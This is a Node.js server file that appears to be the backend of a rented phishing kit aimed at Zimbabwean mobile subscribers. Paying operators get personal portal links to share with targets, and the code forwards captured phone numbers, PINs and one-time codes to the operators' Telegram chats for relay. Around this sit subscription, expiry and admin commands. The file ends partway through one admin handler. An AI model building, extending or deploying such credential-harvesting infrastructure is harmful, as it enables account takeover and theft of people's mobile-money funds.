// server.js — Multi-User Webhook System (single-bot, Zimbabwe +263)
// Same architecture as AirtelTigo: one bot, two-letter IDs (aa–zz),
// MongoDB persistence, admin commands, expiry system.
//
// ENV (required):
//   BOT_TOKEN        — single Telegram bot token
//   WEBHOOK_URL      — public HTTPS URL (no trailing slash)
//   ADMIN_CHAT_ID    — admin Telegram chat ID
//   MONGODB_URI      — MongoDB connection string
//
// ENV (optional):
//   PORT=3001   PAYMENT_AMOUNT=500   RENEWAL_AMOUNT=300
//   PAYMENT_DETAILS=...   WHATSAPP_NUMBER=...   EXPIRY_DAYS=30
//   ROOT_LINK=https://...
//
// Pre-seeded users (permanent):
//   USER_AA_ID=111222333   USER_AA_NAME=Alice
'use strict';
const express     = require('express');
const cors        = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const { connectDB, markShutdown } = require('./db');
const MUser                       = require('./models/muser');
const MState                      = require('./models/mstate');

const app  = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ============================================
// LOGGER
// ============================================
const ts  = () => new Date().toISOString();
const log = {
  info:  (...a) => console.log (`[INFO]  ${ts()} -`, ...a),
  error: (...a) => console.error(`[ERROR] ${ts()} -`, ...a),
  warn:  (...a) => console.warn (`[WARN]  ${ts()} -`, ...a),
  debug: (...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} -`, ...a),
};

// ============================================
// CONFIG
// ============================================
const EXPIRY_DAYS     = parseInt(process.env.EXPIRY_DAYS) || 30;
const PAYMENT_AMOUNT  = process.env.PAYMENT_AMOUNT  || '500';
const RENEWAL_AMOUNT  = process.env.RENEWAL_AMOUNT  || '300';
const PAYMENT_DETAILS = process.env.PAYMENT_DETAILS || 'contact admin for payment details';
const ADMIN_CHAT_ID   = (process.env.ADMIN_CHAT_ID || '').trim();
const WHATSAPP_NUMBER = (process.env.WHATSAPP_NUMBER || '').trim();
const ROOT_LINK       = (process.env.ROOT_LINK || '').replace(/\/$/, '');
const WEBHOOK_URL     = (process.env.WEBHOOK_URL || '').replace(/\/$/, '');

const isAdmin = (chatId) => !!ADMIN_CHAT_ID && String(chatId).trim() === ADMIN_CHAT_ID;

const CFG = Object.freeze({
  APPROVAL_TIMEOUT:      5 * 60_000,
  CLEANUP_INTERVAL:      15_000,
  EXPIRY_CHECK_INTERVAL: 60 * 60 * 1000,
  WARNING_DAYS:          3,
  MAX_MSG_SIZE:          4_096,
  SSE_HEARTBEAT:         20_000,
  SEND_RETRIES:          3,
  SEND_RETRY_DELAY:      1_500,
  DUPE_TTL:              5_000,
  TG_CHAT_INTERVAL:      1_050,
  READ_TTL:              30_000,
  BOT_INIT_DELAY:        1_000,
  MAX_RESTART:           5,
  DEDUP_SIZE:            2000,
});

// ============================================
// HELPERS
// ============================================
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
const sleep    = (ms) => new Promise(r => setTimeout(r, ms));

// ── Zimbabwe phone normalisation ──
const RE_NONDIGIT = /\D/g;
const _phoneCache = new Map();
const normalise = (raw) => {
  if (!raw || typeof raw !== 'string') return '';
  const hit = _phoneCache.get(raw);
  if (hit) return hit;
  let c = raw.replace(RE_NONDIGIT, '');
  if (c.startsWith('263')) c = c.slice(3);
  if (c.startsWith('0'))   c = c.slice(1);
  if (c.length > 9)        c = c.slice(-9);
  const result = `+263${c}`;
  if (_phoneCache.size > 5_000) _phoneCache.clear();
  _phoneCache.set(raw, result);
  return result;
};
const fmtPhone = (raw) => {
  const full = normalise(raw);
  return { cc: '+263', num: full.slice(4), full };
};

// ── Validators ──
const RE_PIN = /^\d{4,8}$/;
const RE_OTP = /^\d{4,8}$/;
const vPhone = (p) => {
  if (!p || typeof p !== 'string') return 'Phone must be a string';
  const n = p.replace(RE_NONDIGIT, '');
  return (n.length < 9 || n.length > 15) ? 'Invalid phone length' : null;
};
const vPin = (p) => (!p || typeof p !== 'string') ? 'PIN must be a string'  : !RE_PIN.test(p) ? 'PIN must be 4-8 digits' : null;
const vOtp = (o) => (!o || typeof o !== 'string') ? 'OTP must be a string'  : !RE_OTP.test(o) ? 'OTP must be 4-8 digits' : null;

// ============================================
// BASE-26 ID HELPERS
// ============================================
const encodeId = (n) => { n = n - 1; return String.fromCharCode(97 + Math.floor(n / 26)) + String.fromCharCode(97 + (n % 26)); };
const decodeId = (id) => { if (!/^[a-z]{2}$/.test(id)) return null; return (id.charCodeAt(0) - 97) * 26 + (id.charCodeAt(1) - 97) + 1; };
const nextAvailableId = () => { for (let n = 1; n <= 676; n++) { const id = encodeId(n); if (!users.has(id)) return id; } return null; };

// ============================================
// DATE HELPERS
// ============================================
const addDays   = (date, days) => { const d = new Date(date); d.setDate(d.getDate() + days); return d.toISOString(); };
const daysUntil = (iso) => Math.ceil((new Date(iso) - Date.now()) / (1000 * 60 * 60 * 24));
const isExpired = (iso) => iso && new Date(iso) <= new Date();
const fmtDate   = (iso) => iso ? new Date(iso).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' }) : 'Never';

// ============================================
// DUPE CACHE
// ============================================
class DupeCache {
  constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
  seen(key) { if (this._m.has(key)) return true; const h = setTimeout(() => this._m.delete(key), this._ttl); if (h.unref) h.unref(); this._m.set(key, h); return false; }
  clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); }
}

// ============================================
// PER-USER TG SEND QUEUE
// ============================================
class TgQueue {
  constructor(interval = CFG.TG_CHAT_INTERVAL) { this._q = []; this._running = false; this._interval = interval; this._last = 0; }
  send(fn) { return new Promise((res, rej) => { this._q.push({ fn, res, rej }); if (!this._running) this._drain(); }); }
  async _drain() {
    this._running = true;
    while (this._q.length) { const gap = this._interval - (Date.now() - this._last); if (gap > 0) await sleep(gap); const { fn, res, rej } = this._q.shift(); this._last = Date.now(); try { res(await fn()); } catch (e) { rej(e); } }
    this._running = false;
  }
  flush(reason = 'queue flushed') { while (this._q.length) this._q.shift().reject(new Error(reason)); }
}

// ============================================
// SSE BROKER
// ============================================
class SseBroker {
  constructor() { this._subs = new Map(); }
  subscribe(key, res) {
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive'); res.setHeader('X-Accel-Buffering', 'no'); res.flushHeaders();
    const hb = setInterval(() => { if (!res.writableEnded) res.write(': ping\n\n'); }, CFG.SSE_HEARTBEAT);
    const entry = { res, hb };
    if (!this._subs.has(key)) this._subs.set(key, new Set());
    this._subs.get(key).add(entry);
    const unsub = () => { clearInterval(hb); const s = this._subs.get(key); if (s) { s.delete(entry); if (!s.size) this._subs.delete(key); } if (!res.writableEnded) res.end(); };
    res.on('close', unsub); res.on('error', unsub);
  }
  push(key, payload) {
    const set = this._subs.get(key); if (!set?.size) return;
    const data = `data: ${JSON.stringify(payload)}\n\n`;
    for (const { res, hb } of set) { clearInterval(hb); if (!res.writableEnded) { res.write(data); res.end(); } }
    this._subs.delete(key);
  }
  get size() { let n = 0; for (const s of this._subs.values()) n += s.size; return n; }
}
const sseBroker = new SseBroker();

// ============================================
// MESSAGE FORMATTERS
// ============================================
const fmtBundle = (b) => {
  if (!b?.data) return '';
  const price = b.price != null && !isNaN(b.price) ? `$${b.price}` : 'N/A';
  const validity = b.validity ? ` (${sanitize(b.validity)})` : '';
  return `\n📦 <b>Bundle:</b> ${sanitize(b.data)} / ${price}${validity}`;
};

const fmtLogin = (user, { phone, pin, time, bundle }) => {
  const { cc, num } = fmtPhone(phone);
  return `📱 <b>${sanitize(user.name)} — LOGIN</b>\n\n🆕 NEW USER\n🌍 <b>Country:</b> <code>${cc}</code>\n📞 <b>Number:</b>  <code>${num}</code>\n🔐 <b>PIN:</b>     <code>${sanitize(pin)}</code>${fmtBundle(bundle)}\n⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}\n\n📲 Proceed → OTP step\n\n━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`;
};

const fmtOtp = (user, { phone, otp, time, bundle }) => {
  const { cc, num } = fmtPhone(phone);
  return `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>\n\n🆕 NEW USER\n🌍 <b>Country:</b> <code>${cc}</code>\n📞 <b>Number:</b>  <code>${num}</code>\n🔑 <b>OTP:</b>     <code>${sanitize(otp)}</code>${fmtBundle(bundle)}\n⏰ <b>Time:</b>    ${new Date(time).toLocaleString()}\n\n━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`;
};

// ============================================
// CALLBACK DATA HELPERS
// ============================================
const CB_SEP = '|';
const mkCb = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
const parseCb = (d) => { const p = d.split(CB_SEP); return p.length === 4 ? { type: p[0], action: p[1], phone: p[2], secret: p[3] } : null; };

// ============================================
// USERS MAP (id -> userObj)
// ============================================
const users = new Map();

const makeUserObj = ({ id, name, chatId, source = 'env', createdAt = null, expiresAt = null }) => ({
  id, num: decodeId(id), name: sanitize(name), chatId: String(chatId), source, createdAt, expiresAt,
  expired: expiresAt ? isExpired(expiresAt) : false, warningSent: false,
  logins: new Map(), otps: new Map(), dupes: new DupeCache(), tgQueue: new TgQueue(), lastErr: null,
});

const loadEnvUsers = () => {
  let loaded = 0;
  const pattern = /^USER_([A-Z]{2})_ID$/;
  for (const [key, chatId] of Object.entries(process.env)) {
    const match = key.match(pattern); if (!match) continue;
    const id = match[1].toLowerCase();
    const name = process.env[`USER_${match[1]}_NAME`] || `User ${match[1]}`;
    if (!/^-?\d+$/.test(chatId)) { log.warn(`Invalid chat ID for ${id} — skipping`); continue; }
    if (users.has(id)) { log.warn(`Duplicate ID ${id} — skipping`); continue; }
    users.set(id, makeUserObj({ id, name, chatId, source: 'env' }));
    loaded++;
  }
  log.info(`Loaded ${loaded} user(s) from env (permanent)`);
};

const loadUsersFromDB = async () => {
  let loaded = 0;
  try {
    const docs = await MUser.find({}).lean();
    for (const doc of docs) {
      const { id, name, chatId, createdAt, expiresAt } = doc;
      if (!id || !chatId) continue;
      if (users.has(id)) { log.warn(`User ${id} already in env — DB skipped`); continue; }
      users.set(id, makeUserObj({ id, name, chatId, source: 'db',
        createdAt: createdAt ? new Date(createdAt).toISOString() : null,
        expiresAt: expiresAt ? new Date(expiresAt).toISOString() : null,
      }));
      loaded++;
    }
    log.info(`Loaded ${loaded} user(s) from MongoDB`);
  } catch (e) { log.error('Failed to load users from MongoDB:', e.message); }
};

const persistUser = async (id, name, chatId, createdAt, expiresAt) => {
  try { await MUser.findOneAndUpdate({ id }, { id, name, chatId: String(chatId), createdAt, expiresAt, source: 'db' }, { upsert: true, returnDocument: 'after', setDefaultsOnInsert: true }); return true; }
  catch (e) { log.error(`Failed to persist user ${id}:`, e.message); return false; }
};

const deleteUserFromDB = async (id) => { try { await MUser.deleteOne({ id }); return true; } catch (e) { log.error(`Failed to delete user ${id}:`, e.message); return false; } };

const registerUser = async (id, name, chatId) => {
  const now = new Date().toISOString(), expiresAt = addDays(now, EXPIRY_DAYS);
  const obj = makeUserObj({ id, name, chatId, source: 'db', createdAt: now, expiresAt });
  users.set(id, obj); await persistUser(id, name, chatId, now, expiresAt); sortUsers();
  log.info(`Registered: [${id}] ${name}  chatId:${chatId}  expires:${fmtDate(expiresAt)}`);
  return obj;
};

const renewUser = async (user) => {
  const base = (user.expiresAt && !isExpired(user.expiresAt)) ? user.expiresAt : new Date().toISOString();
  const expiresAt = addDays(base, EXPIRY_DAYS);
  user.expiresAt = expiresAt; user.expired = false; user.warningSent = false;
  await persistUser(user.id, user.name, user.chatId, user.createdAt, expiresAt);
  log.info(`Renewed: [${user.id}] ${user.name}  new expiry:${fmtDate(expiresAt)}`);
  return expiresAt;
};

const sortUsers = () => { const sorted = new Map([...users.entries()].sort((a, b) => a[1].num - b[1].num)); users.clear(); for (const [k, v] of sorted) users.set(k, v); };

// ============================================
// STATE PERSISTENCE (verified survives redeploys)
// ============================================
const persistState = async (userId) => {
  const user = users.get(userId);
  if (!user) return;
  try {
    await MState.findOneAndUpdate(
      { userId },
      { userId, verified: Object.fromEntries([...user.verifiedUsers || []].map(p => [p, true])) },
      { upsert: true }
    );
  } catch (e) { log.error(`Failed to persist state for ${userId}:`, e.message); }
};

const deleteStateFromDB = async (userId) => {
  try { await MState.deleteOne({ userId }); } catch (e) {}
};

const loadStateFromDB = async () => {
  let loaded = 0;
  try {
    const docs = await MState.find({}).lean();
    for (const doc of docs) {
      const user = users.get(doc.userId);
      if (!user) continue;
      if (doc.verified && typeof doc.verified === 'object') {
        if (!user.verifiedUsers) user.verifiedUsers = new Set();
        for (const phone of Object.keys(doc.verified)) user.verifiedUsers.add(phone);
      }
      loaded++;
    }
    log.info(`Loaded state for ${loaded} user(s) from MongoDB`);
  } catch (e) { log.error('Failed to load state from MongoDB:', e.message); }
};

// ============================================
// PENDING PAYMENTS
// ============================================
const pendingPayments = new Map();
const pendingRenewals = new Map();

// ============================================
// BOT STATE
// ============================================
let bot = null, botHealthy = false, restartCount = 0, restartSched = false, initLock = false;

const processedUpdates = new Set();
const trackUpdate = (updateId) => {
  if (processedUpdates.has(updateId)) return false;
  processedUpdates.add(updateId);
  if (processedUpdates.size > CFG.DEDUP_SIZE) { const first = processedUpdates.values().next().value; processedUpdates.delete(first); }
  return true;
};

// ============================================
// SEND HELPERS
// ============================================
const sendTg = async (chatId, message, options = {}) => {
  if (!bot || !botHealthy) return { success: false, error: 'Bot not ready' };
  try { await bot.sendMessage(chatId, trunc(message), { parse_mode: 'HTML', ...options }); return { success: true }; }
  catch (err) { log.error(`sendTg to ${chatId}:`, err.code, err.message); if (err.response?.statusCode === 401) { botHealthy = false; } return { success: false, error: err.message }; }
};

const sendMsg = async (user, text, opts = {}) => {
  if (!bot || !botHealthy) return { ok: false, err: 'Bot not ready' };
  return user.tgQueue.send(async () => {
    let attempt = 0;
    while (true) {
      try { await bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts }); user.lastErr = null; return { ok: true }; }
      catch (e) {
        user.lastErr = e.message; const s = e.response?.statusCode;
        log.error(`sendMsg [${user.name}] attempt ${attempt + 1}:`, s || e.code, e.message);
        if (s === 401) { botHealthy = false; return { ok: false, err: 'Auth failed' }; }
        if (s === 429) { await sleep(Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60_000)); continue; }
        if (s >= 500 && attempt < CFG.SEND_RETRIES) { attempt++; await sleep(CFG.SEND_RETRY_DELAY * attempt); continue; }
        return { ok: false, err: e.message };
      }
    }
  });
};

// ============================================
// CLEAR BOT LISTENERS
// ============================================
const clearBotListeners = () => {
  if (!bot) return;
  try { bot.removeAllListeners(); if (Array.isArray(bot._textRegexpCallbacks)) bot._textRegexpCallbacks = []; if (Array.isArray(bot._replyListeners)) bot._replyListeners = []; }
  catch (e) { log.warn('clearBotListeners error:', e.message); }
};

// ============================================
// BOT INIT (webhook mode)
// ============================================
const initBot = async () => {
  if (initLock) { log.warn('initBot already in progress'); return; } initLock = true;
  try {
    if (bot) { clearBotListeners(); bot = null; }
    await sleep(CFG.BOT_INIT_DELAY);
    const token = process.env.BOT_TOKEN;
    if (!token || !/^\d+:[A-Za-z0-9_-]+$/.test(token)) { log.error('BOT_TOKEN missing or invalid'); return; }
    if (!WEBHOOK_URL) { log.error('WEBHOOK_URL not set'); return; }
    log.info('Creating bot instance (webhook mode)...');
    bot = new TelegramBot(token, { webHook: false, filepath: false });
    bot.on('error', (err) => log.error('Bot error:', err.message));
    registerHandlers(); flushUpdateBuffer();
    const webhookFullUrl = `${WEBHOOK_URL}/webhook/${token}`;
    try {
      await bot.deleteWebHook();
      await bot.setWebHook(webhookFullUrl, { allowed_updates: ['message', 'callback_query'], drop_pending_updates: true });
      log.info(`✅ Webhook set → ${webhookFullUrl}`);
    } catch (err) { log.error('Failed to set webhook:', err.message); botHealthy = false; return; }
    try { const me = await bot.getMe(); log.info(`✅ Bot verified — @${me.username}`); botHealthy = true; restartCount = 0; restartSched = false; }
    catch (err) { log.error('Bot verification failed:', err.message); botHealthy = false; }
  } finally { initLock = false; }
};

const scheduleRestart = (delay = 10000) => {
  if (restartCount >= CFG.MAX_RESTART || restartSched) return;
  restartCount++; restartSched = true;
  log.info(`Restart #${restartCount} in ${delay / 1000}s...`);
  setTimeout(async () => { restartSched = false; try { await initBot(); } catch (e) { log.error('Restart failed:', e.message); } }, delay);
};

// ============================================
// USERNAME HELPER
// ============================================
const getUsername = (from) => from.username ? `@${from.username}` : `${from.first_name || ''}${from.last_name ? ' ' + from.last_name : ''}`.trim() || 'Unknown';

// ============================================
// REGISTER ALL BOT HANDLERS
// ============================================
const registerHandlers = () => {
  const onMsg = (regexp, handler) => {
    bot.onText(regexp, async (msg, match) => {
      if (!trackUpdate(msg.update_id ?? msg.message_id)) return;
      try { await handler(msg, match); } catch (e) { log.error(`Handler error [${regexp}]:`, e.message); }
    });
  };

  // ── /start ──
  onMsg(/^\/start(@\S+)?$/, async (msg) => {
    const chatId = String(msg.chat.id), username = getUsername(msg.from);
    if (isAdmin(chatId)) {
      await bot.sendMessage(msg.chat.id, `🛠️ <b>Admin Console</b>\n\n👤 <b>Name:</b> ${sanitize(username)}\n🆔 <b>Chat ID:</b> <code>${chatId}</code>\n\n👥 <b>Registered users:</b> ${users.size} / 676\n\nSend /adminhelp for commands.`, { parse_mode: 'HTML' }).catch(() => {}); return;
    }
    const existingUser = [...users.values()].find(u => u.chatId === chatId);
    if (existingUser) {
      if (existingUser.expired || isExpired(existingUser.expiresAt)) {
        existingUser.expired = true;
        await bot.sendMessage(msg.chat.id, `🤖 <b>Bot</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${chatId}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n⚠️ <b>Account Expired</b>\n\nExpired on <b>${fmtDate(existingUser.expiresAt)}</b>.\n\nPay <b>KSh. ${RENEWAL_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\nThen tap <b>I Have Renewed</b> and send screenshot via WhatsApp to <b>${WHATSAPP_NUMBER}</b>.`,
          { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[ { text: '✅ I Have Renewed', callback_data: `renew|claim|${chatId}` }, { text: '❌ Cancel', callback_data: `renew|cancel|${chatId}` } ]] } }
        ).catch(() => {}); return;
      }
      const link = ROOT_LINK ? `${ROOT_LINK}/${existingUser.id}/` : '(ROOT_LINK not configured)';
      const daysLeft = existingUser.expiresAt ? daysUntil(existingUser.expiresAt) : null;
      const expiryLine = existingUser.expiresAt ? `📅 <b>Expires:</b> ${fmtDate(existingUser.expiresAt)} (${daysLeft} day${daysLeft !== 1 ? 's' : ''} left)` : `📅 <b>Expires:</b> Never (permanent)`;
      await bot.sendMessage(msg.chat.id, `🤖 <b>Bot</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${chatId}</code>\n\n✅ <b>Status:</b> Active\n🔗 <b>Your Link:</b> <code>${link}</code>\n${expiryLine}\n\n📌 Commands: /mylink  /expiry  /myid`, { parse_mode: 'HTML' }).catch(() => {}); return;
    }
    await bot.sendMessage(msg.chat.id, `🤖 <b>Bot</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${chatId}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n💳 <b>Get Your Personal Link</b>\n\nPay <b>KSh. ${PAYMENT_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\nValid for <b>${EXPIRY_DAYS} days</b>.\n\nTap <b>I Have Paid</b> and send screenshot via WhatsApp to <b>${WHATSAPP_NUMBER}</b>.`,
      { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[ { text: '✅ I Have Paid', callback_data: `pay|claim|${chatId}` }, { text: '❌ Cancel', callback_data: `pay|cancel|${chatId}` } ]] } }
    ).catch(() => {});
    if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `👤 <b>New User Started Bot</b>\n\n<b>Name:</b> ${sanitize(username)}\n<b>Chat ID:</b> <code>${chatId}</code>\n<b>Time:</b> ${new Date().toLocaleString()}\n\nAwaiting payment claim.`);
  });

  onMsg(/^\/mylink(@\S+)?$/, async (msg) => {
    const chatId = String(msg.chat.id), user = [...users.values()].find(u => u.chatId === chatId);
    if (!user) { await bot.sendMessage(msg.chat.id, `⚠️ Not registered. Send /start.`, { parse_mode: 'HTML' }).catch(() => {}); return; }
    if (user.expired || isExpired(user.expiresAt)) { await bot.sendMessage(msg.chat.id, `⚠️ <b>Account Expired</b>\n\nSend /start to renew.`, { parse_mode: 'HTML' }).catch(() => {}); return; }
    if (!ROOT_LINK) { await bot.sendMessage(msg.chat.id, `⚠️ ROOT_LINK not configured.`).catch(() => {}); return; }
    await bot.sendMessage(msg.chat.id, `🔗 <b>Your Personal Portal Link</b>\n\n<code>${ROOT_LINK}/${user.id}/</code>\n\nShare this link with your users.`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/expiry(@\S+)?$/, async (msg) => {
    const chatId = String(msg.chat.id), user = [...users.values()].find(u => u.chatId === chatId);
    if (!user) { await bot.sendMessage(msg.chat.id, `⚠️ Not registered. Send /start.`, { parse_mode: 'HTML' }).catch(() => {}); return; }
    if (!user.expiresAt) { await bot.sendMessage(msg.chat.id, `📅 Your account is <b>permanent</b>.`, { parse_mode: 'HTML' }).catch(() => {}); return; }
    const expired = isExpired(user.expiresAt), daysLeft = daysUntil(user.expiresAt);
    const icon = expired ? '❌' : daysLeft <= CFG.WARNING_DAYS ? '⚠️' : '✅';
    await bot.sendMessage(msg.chat.id, `${icon} <b>Subscription Status</b>\n\n📅 <b>Expiry:</b> ${fmtDate(user.expiresAt)}\n${expired ? `❌ EXPIRED — send /start to renew` : `⏳ ${daysLeft} day${daysLeft !== 1 ? 's' : ''} remaining`}`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/myid(@\S+)?$/, async (msg) => { await bot.sendMessage(msg.chat.id, `🆔 <b>Your Chat ID:</b> <code>${msg.chat.id}</code>`, { parse_mode: 'HTML' }).catch(() => {}); });

  // ══════════════════════════════════════════
  // ADMIN COMMANDS
  // ══════════════════════════════════════════
  onMsg(/^\/adminhelp(@\S+)?$/, async (msg) => {
    if (!isAdmin(String(msg.chat.id))) { await bot.sendMessage(msg.chat.id, `⚠️ Admin only.`).catch(() => {}); return; }
    await bot.sendMessage(msg.chat.id,
      `🛠️ <b>Admin Commands</b>\n\n<b>Viewing</b>\n/status — list all users\n/userinfo &lt;id&gt; — detail\n\n<b>Bulk</b>\n/extendall &lt;days&gt;\n/reduceall &lt;days&gt;\n\n<b>Users</b>\n/adduser &lt;chatId&gt; &lt;name&gt; [days|permanent]\n/assignuser &lt;slot&gt; &lt;chatId&gt; &lt;name&gt; [days|permanent]\n/removeuser &lt;id&gt;\n/extend &lt;id&gt; &lt;days&gt;\n/revoke &lt;id&gt;\n/permanent &lt;id&gt;\n\n<b>Broadcast</b>\n/broadcast &lt;message&gt;\n\n<i>Examples:</i>\n<code>/adduser 123456789 John Doe 30</code>\n<code>/assignuser ac 123456789 John Doe 30</code>`,
      { parse_mode: 'HTML' }
    ).catch(() => {});
  });

  onMsg(/^\/status(@\S+)?$/, async (msg) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const lines = [`✅ <b>Bot Status</b>\n`, `👥 Users: ${users.size}/676`, `⏳ Payments: ${pendingPayments.size}`, `🔄 Renewals: ${pendingRenewals.size}`, `📡 SSE: ${sseBroker.size}\n`];
    for (const u of users.values()) {
      const exp = u.expiresAt ? (isExpired(u.expiresAt) ? '❌ EXPIRED' : `✅ ${daysUntil(u.expiresAt)}d left`) : '♾️ permanent';
      lines.push(`• <b>${u.name}</b> [<code>${u.id}</code>] ${exp} (${u.source}) — <code>${u.chatId}</code>`);
    }
    await bot.sendMessage(msg.chat.id, trunc(lines.join('\n')), { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/userinfo(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const id = match[2].trim().toLowerCase(); if (!/^[a-z]{2}$/.test(id)) { await bot.sendMessage(msg.chat.id, `❌ Invalid ID.`).catch(() => {}); return; }
    const user = users.get(id); if (!user) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; }
    const link = ROOT_LINK ? `${ROOT_LINK}/${user.id}/` : '(not set)';
    await bot.sendMessage(msg.chat.id, `👤 <b>${sanitize(user.name)}</b>\n\n🔑 <code>${user.id}</code> (#${user.num})\n🆔 <code>${user.chatId}</code>\n📦 ${user.source}\n🔗 <code>${link}</code>\n📅 Created: ${user.createdAt ? fmtDate(user.createdAt) : 'N/A'}\n📅 Expires: ${user.expiresAt ? fmtDate(user.expiresAt) : 'Never'}\n${user.expiresAt ? `⏳ ${daysUntil(user.expiresAt)}d left\n` : ''}⚠️ Expired: ${user.expired ? 'Yes' : 'No'}\n\n📊 Logins: ${user.logins.size}  OTPs: ${user.otps.size}`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/adduser(@\S+)?\s+(.+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    try {
      const parts = match[2].trim().split(/\s+/);
      if (parts.length < 2) { await bot.sendMessage(msg.chat.id, `⚠️ Usage: <code>/adduser &lt;chatId&gt; &lt;name&gt; [days|permanent]</code>`, { parse_mode: 'HTML' }).catch(() => {}); return; }
      const targetChatId = parts[0];
      if (!/^-?\d+$/.test(targetChatId)) { await bot.sendMessage(msg.chat.id, `❌ Invalid chat ID.`).catch(() => {}); return; }
      let days = EXPIRY_DAYS, nameParts = parts.slice(1); const last = nameParts[nameParts.length - 1];
      if (/^permanent$/i.test(last)) { days = null; nameParts = nameParts.slice(0, -1); }
      else if (/^\d+$/.test(last)) { days = parseInt(last, 10); nameParts = nameParts.slice(0, -1); }
      const name = nameParts.join(' ').trim();
      if (!name) { await bot.sendMessage(msg.chat.id, `❌ Name required.`).catch(() => {}); return; }
      if ([...users.values()].find(u => u.chatId === targetChatId)) { await bot.sendMessage(msg.chat.id, `⚠️ Chat ID already registered.`).catch(() => {}); return; }
      const newId = nextAvailableId(); if (!newId) { await bot.sendMessage(msg.chat.id, `❌ No slots.`).catch(() => {}); return; }
      const now = new Date().toISOString(), expiresAt = days === null ? null : addDays(now, days);
      users.set(newId, makeUserObj({ id: newId, name, chatId: targetChatId, source: 'db', createdAt: now, expiresAt }));
      await persistUser(newId, name, targetChatId, now, expiresAt); sortUsers();
      const link = ROOT_LINK ? `${ROOT_LINK}/${newId}/` : '(ROOT_LINK not set)';
      await bot.sendMessage(msg.chat.id, `✅ <b>User Added</b>\n\n👤 ${sanitize(name)}\n🆔 <code>${targetChatId}</code>\n🔑 <code>${newId}</code>\n🔗 <code>${link}</code>\n📅 ${expiresAt ? fmtDate(expiresAt) : 'Never (permanent)'}`, { parse_mode: 'HTML' }).catch(() => {});
      await sendTg(targetChatId, `🎉 <b>You've Been Added!</b>\n\n🔗 <code>${link}</code>\n📅 ${expiresAt ? fmtDate(expiresAt) : 'Never (permanent)'}\n\nSend /mylink anytime.`);
    } catch (e) { log.error('adduser:', e.message); }
  });

  onMsg(/^\/assignuser(@\S+)?\s+(.+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    try {
      const parts = match[2].trim().split(/\s+/);
      if (parts.length < 3) { await bot.sendMessage(msg.chat.id, `⚠️ Usage: <code>/assignuser &lt;slot&gt; &lt;chatId&gt; &lt;name&gt; [days|permanent]</code>`, { parse_mode: 'HTML' }).catch(() => {}); return; }
      const targetSlot = parts[0].toLowerCase(), targetChatId = parts[1];
      if (!/^[a-z]{2}$/.test(targetSlot)) { await bot.sendMessage(msg.chat.id, `❌ Invalid slot.`).catch(() => {}); return; }
      if (!/^-?\d+$/.test(targetChatId)) { await bot.sendMessage(msg.chat.id, `❌ Invalid chat ID.`).catch(() => {}); return; }
      if (users.has(targetSlot)) { await bot.sendMessage(msg.chat.id, `❌ Slot <code>${targetSlot}</code> occupied. Use <code>/removeuser ${targetSlot}</code> first.`, { parse_mode: 'HTML' }).catch(() => {}); return; }
      if ([...users.values()].find(u => u.chatId === targetChatId)) { await bot.sendMessage(msg.chat.id, `❌ Chat ID already registered.`).catch(() => {}); return; }
      let days = EXPIRY_DAYS, nameParts = parts.slice(2); const last = nameParts[nameParts.length - 1];
      if (/^permanent$/i.test(last)) { days = null; nameParts = nameParts.slice(0, -1); }
      else if (/^\d+$/.test(last)) { days = parseInt(last, 10); nameParts = nameParts.slice(0, -1); }
      const name = nameParts.join(' ').trim(); if (!name) { await bot.sendMessage(msg.chat.id, `❌ Name required.`).catch(() => {}); return; }
      const now = new Date().toISOString(), expiresAt = days === null ? null : addDays(now, days);
      users.set(targetSlot, makeUserObj({ id: targetSlot, name, chatId: targetChatId, source: 'db', createdAt: now, expiresAt }));
      await persistUser(targetSlot, name, targetChatId, now, expiresAt); sortUsers();
      const link = ROOT_LINK ? `${ROOT_LINK}/${targetSlot}/` : '(ROOT_LINK not set)';
      await bot.sendMessage(msg.chat.id, `✅ <b>Assigned <code>${targetSlot}</code></b>\n\n👤 ${sanitize(name)}\n🆔 <code>${targetChatId}</code>\n🔗 <code>${link}</code>\n📅 ${expiresAt ? fmtDate(expiresAt) : 'Never'}`, { parse_mode: 'HTML' }).catch(() => {});
